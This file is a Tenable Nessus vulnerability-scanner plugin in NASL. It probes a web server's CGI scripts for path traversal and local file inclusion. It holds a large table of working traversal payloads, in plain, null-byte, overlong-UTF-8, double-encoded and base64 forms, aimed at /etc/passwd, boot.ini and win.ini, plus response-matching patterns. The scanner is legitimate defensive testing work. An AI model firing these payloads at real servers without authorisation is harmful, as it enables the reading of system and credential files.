#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(50494);
 script_version ("$Revision: 1.13 $");

 script_name(english: "CGI Generic Path Traversal (quick test)");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be accessed or executed on the remote host.");
 script_set_attribute(attribute:"description", value:
"The remote web server hosts CGI scripts that fail to adequately
sanitize request strings and are affected by directory traversal or
local files inclusion vulnerabilities. 

By leveraging this issue, an attacker may be able to read arbitrary 
files on the web server or execute commands." );
 script_set_attribute(attribute:"see_also", value:"http://en.wikipedia.org/wiki/Directory_traversal" );
 script_set_attribute(attribute:"see_also", value:"http://projects.webappsec.org/Path-Traversal");
 script_set_attribute(attribute:"see_also", value:"http://projects.webappsec.org/Null-Byte-Injection");
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?addbae30");

 script_set_attribute(attribute:"solution", value:
"Restrict access to the vulnerable application. Contact the 
vendor for a patch or upgrade." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_cwe_id(
  21,  # Pathname Traversal and Equivalence Errors
  22,  # Path Traversal
  632, # Weaknesses that Affect Files or Directories
  715, # OWASP Top Ten 2007 Category A4 - Insecure Direct Object Reference
  723, # OWASP Top Ten 2004 Category A2 - Broken Access Control
  813, # OWASP Top Ten 2010 Category A4 - Insecure Direct Object References
  928, # Weaknesses in OWASP Top Ten 2013
  932  # OWASP Top Ten 2013 Category A4 - Insecure Direct Object References
 );
 script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/05");
 script_cvs_date("$Date: 2017/01/05 15:28:31 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_xref(name:"OWASP", value:"OWASP-AZ-001");

 script_summary(english: "Tortures the arguments of the remote CGIs (traversal, quick teest)");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("http_version.nasl", "webmirror.nasl", "web_app_test_settings.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/enable_web_app_tests");
 script_timeout(43200);	# Timeout is managed by the script itself
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("torture_cgi.inc");

function torture_cgi_response_post_check(resp) { return 0; }	# stub

function identify_testable_args(port, vul, find, replace)
{
  local_var	vals_l, i, j, v1, v2, r1, r2, r3, u1, u2, retry, vl, d;
  local_var	cgi_l, cgi_name, args_l, num_args, arg;
  local_var	redo;

  testable_args = make_array();

  cgi_l = get_cgi_list(port: port);
  if (max_index(cgi_l) == 0) return;
  foreach cgi_name (cgi_l)
  {
    if (already_known_flaw(port: port, cgi: cgi_name, vul: vul)) continue;
    args_l = get_cgi_arg_list(port: port, cgi: cgi_name);

    num_args = 0;
    foreach arg (args_l)
    {
      d = get_cgi_arg_val_list(port: port, cgi: cgi_name, arg: arg, fill: 1);
      if (test_arg_val == "single") d = make_list(d[0]);
      if (max_tested_values > 0) d = shrink_list(l: d, n: max_tested_values);
      vals_l[num_args ++] = d;
    }

    #### Try only incomplete URIs - this will be quicker ####
    for (i = 0; args_l[i]; i ++)
    {
      vl = vals_l[i];
      for (j = 0; ! isnull(vl[j]); j ++)
      {
        v1 = vl[j];
	v2 = ereg_replace(string: v1, pattern: find, replace: replace);
	if (v1 == v2) continue;

	http_reauthenticate_if_needed(port: port);

	u1 = my_encode(strcat(cgi_name, "?", args_l[i], "=", v1));
	u2 = my_encode(strcat(cgi_name, "?", args_l[i], "=", v2));

	for (redo = 3; redo > 0; redo --)
	{
	  r1 = NULL; r2 = NULL; r3 = NULL;

	  for (retry = 1; retry <= 3 && isnull(r1); retry ++)
	    r1 = http_send_recv3(method:"GET", port: port, item: u1);
	  if (isnull(r1)) return;

	  for (retry = 1; retry <= 3 && isnull(r2); retry ++)
	    r2 = http_send_recv3(method:"GET", port: port, item: u2);
	  if (isnull(r2)) return;
	
	  if (! answers_differ(r1: r1, r2: r2))
	  {
	    testable_args[strcat(cgi_name, "/", args_l[i])] = 1;
	    debug_print(level:2, 'Testable CGI: ', cgi_name, ' Arg: ', args_l[i], '\n');
	    break;
          }

	  # Let's check that the page may have changed, to avoid a false 
	  # negative. If it did, we retry the test a couple of times.
	  for (retry = 1; retry <= 3 && isnull(r3); retry ++)
	    r3 = http_send_recv3(method:"GET", port: port, item: u1);
 	  if (isnull(r3)) return;

	  if (! answers_differ(r1: r1, r2: r3)) break;
        }
	if (redo > 0) break;
      }
    }
  }
}

####

i = 0; 
# We may insert kazillons of patterns here, as the parameters are filtered
flaws_and_patterns = make_array(
"/etc/passwd",						"RE:root:.*:0:[01]:",
"../../../../../../../../etc/passwd",			"RE:root:.*:0:[01]:",
"../../../../../../../../etc/passwd%00",		"RE:root:.*:0:[01]:",
"../../../../../../../../etc/passwd%00.html",		"RE:root:.*:0:[01]:",
"../../../../../../../../etc/passwd%00index.html",	"RE:root:.*:0:[01]:",
"%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",	"RE:root:.*:0:[01]:",
# this one is ../../../etc/passwd uuencoded - at least one cgi was vulnerable to this.
"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAo=",		"RE:root:.*:0:[01]:",
"%60/etc/passwd%60",					"RE:root:.*:0:[01]:",

"/etc",							"ST:resolv.conf",
"../../../../../../../../etc",				"ST:resolv.conf",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc",		"ST:resolv.conf",
"%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc",	"ST:resolv.conf",

"....//....//....//....//....//....//....//....//etc/passwd", "RE:root:.*:0:[01]:",
"....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd", "RE:root:.*:0:[01]:",

"%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc%e0%80%afpasswd",
 "RE:root:.*:0:[01]:",
"%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc%c0%afpasswd",
 "RE:root:.*:0:[01]:",

"..../..../..../..../..../..../..../..../etc/passwd",	"RE:root:.*:0:[01]:",
".../.../.../.../.../.../.../.../etc/passwd",		"RE:root:.*:0:[01]:",

'..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini',	'RE:\\[boot( |%20)loader\\]',
'../../../../../../../../../boot.ini',		'RE:\\[boot( |%20)loader\\]',
'..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini%00.htm',	'RE:\\[boot( |%20)loader\\]',
'../../../../../../../../../boot.ini%00.txt',		'RE:\\[boot( |%20)loader\\]',

'..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',	"ST:[windows]",
"../../../../../../../../windows/win.ini",		"ST:[windows]",
'..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini',	"ST:[fonts]",
"../../../../../../../../winnt/win.ini",		"ST:[fonts]",

"../../../../../../../winnt",		"PI:*system.ini*",
"../../../../../../../windows",		"PI:*system.ini*",
'..\\..\\..\\..\\..\\..\\..\\windows',	"PI:*system.ini*",
'..\\..\\..\\..\\..\\..\\..\\winnt',	"PI:*system.ini*",

"..../\..../\..../\..../\..../\..../\..../\..../\..../\boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"..../\..../\..../\..../\..../\..../\..../\..../\windows\win.ini",
  "RE:\[(windows|fonts)\]",
"..../\..../\..../\..../\..../\..../\..../\..../\winnt\win.ini",
  "RE:\[(windows|fonts)\]",

"....//....//....//....//....//....//....//....//....//boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"....//....//....//....//....//....//....//....//windows/win.ini",
  "RE:\[(windows|fonts)\]",
"....//....//....//....//....//....//....//....//winnt/win.ini",
  "RE:\[(windows|fonts)\]",

"....\\....\\....\\....\\....\\....\\....\\....\\....\\boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"....\\....\\....\\....\\....\\....\\....\\....\\windows\win.ini",
  "RE:\[(windows|fonts)\]",
"....\\....\\....\\....\\....\\....\\....\\....\\winnt\win.ini",
  "RE:\[(windows|fonts)\]",
"....\/....\/....\/....\/....\/....\/....\/....\/....\/boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"....\/....\/....\/....\/....\/....\/....\/....\/windows/win.ini",
  "RE:\[(windows|fonts)\]",
"....\/....\/....\/....\/....\/....\/....\/....\/winnt/win.ini",
  "RE:\[(windows|fonts)\]",

"/%80../%80../%80../%80../%80../%80../%80../%80../%80..boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"/%80../%80../%80../%80../%80../%80../%80../%80..windows\win.ini",
  "RE:\[(windows|fonts)\]",
"/%80../%80../%80../%80../%80../%80../%80../%80..winnt\win.ini",
  "RE:\[(windows|fonts)\]",

"/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0.boot.ini",
  'RE:\\[boot( |%20)loader\\]',
"/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0.windows\win.ini",
  "RE:\[(windows|fonts)\]",
"/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0.winnt\win.ini",
  "RE:\[(windows|fonts)\]",

"/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2eboot.ini",
  'RE:\\[boot( |%20)loader\\]',
"/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2ewindows\win.ini",
  "RE:\[(windows|fonts)\]",
"/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2ewinnt\win.ini",
  "RE:\[(windows|fonts)\]",

"%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216boot%u002eini",
  'RE:\\[boot( |%20)loader\\]',
"%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216windows%u2216win%u002eini",
  "RE:\[(windows|fonts)\]",
"%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216winnt%u2216win%u002eini",
  "RE:\[(windows|fonts)\]",
"%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215boot%u002eini",
  'RE:\\[boot( |%20)loader\\]',
"%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215windows%u2215win%u002eini",
  "RE:\[(windows|fonts)\]",
"%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215winnt%u2215win%u002eini",
  "RE:\[(windows|fonts)\]",

"%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot%252eini",
  'RE:\\[boot( |%20)loader\\]',
"%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin%252eini",
  "RE:\[(windows|fonts)\]",
"%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwinnt%255cwin%252eini",
  "RE:\[(windows|fonts)\]",
"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot%252eini",
  'RE:\\[boot( |%20)loader\\]',
"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin%252eini",
  "RE:\[(windows|fonts)\]",
"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwinnt%252fwin%252eini",
  "RE:\[(windows|fonts)\]",

"%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot%c0%2eini",
  'RE:\\[boot( |%20)loader\\]',
"%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cwindows%c0%5cwin%c0%2eini",
  "RE:\[(windows|fonts)\]",
"%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cwinnt%c0%5cwin%c0%2eini",
  "RE:\[(windows|fonts)\]",
"%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afboot%c0%2eini",
  'RE:\\[boot( |%20)loader\\]',
"%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afwindows%c0%afwin%c0%2eini",
  "RE:\[(windows|fonts)\]",
"%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afwinnt%c0%afwin%c0%2eini",
  "RE:\[(windows|fonts)\]",

"%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cboot%e0%40%aeini",
  'RE:\\[boot( |%20)loader\\]',
"%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cwindows%c0%80%5cwin%e0%40%aeini",
  "RE:\[(windows|fonts)\]",
"%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5c%e0%40%ae%e0%40%ae%c0%80%5cwinnt%c0%80%5cwin%e0%40%aeini",
  "RE:\[(windows|fonts)\]",
"%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afboot%e0%40%aeini",
  'RE:\\[boot( |%20)loader\\]',
"%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afwindows%e0%80%afwin%e0%40%aeini",
  "RE:\[(windows|fonts)\]",
"%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afwinnt%e0%80%afwin%e0%40%aeini",
  "RE:\[(windows|fonts)\]"
);

####

port = torture_cgi_init(vul:'TQ');


identify_testable_args(port: port, vul:"TQ",
  find: "(.+)/", replace: "\1/foo/../");

report = torture_cgis(port: port, vul: "TQ");

if (strlen(report) > 0)
{
  security_warning(port:port, extra: report);
}
